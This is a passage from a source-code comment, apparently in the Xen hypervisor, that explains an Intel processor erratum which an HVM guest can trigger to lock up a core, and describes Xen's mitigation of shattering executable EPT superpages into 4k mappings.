 *
 * Intel's [guidance](https://www.intel.com/content/www/us/en/developer/articles/troubleshooting/software-security-guidance/advisory-guidance/machine-check-error-avoidance-page-size-change.html).
 *
 * An erratum exists on various generations of Intel processors, that can be
 * tickled by an HVM guest kernel, resulting in a core lockup and full system
 * denial of service.
 *
 * To mitigate, Xen ensures that no EPT superpages are executable, shattering
 * to 4k mappings if execution is needed.  This prevents >4k mappings from
 * entering the iTLB, and blocks a precondition of the erratum.
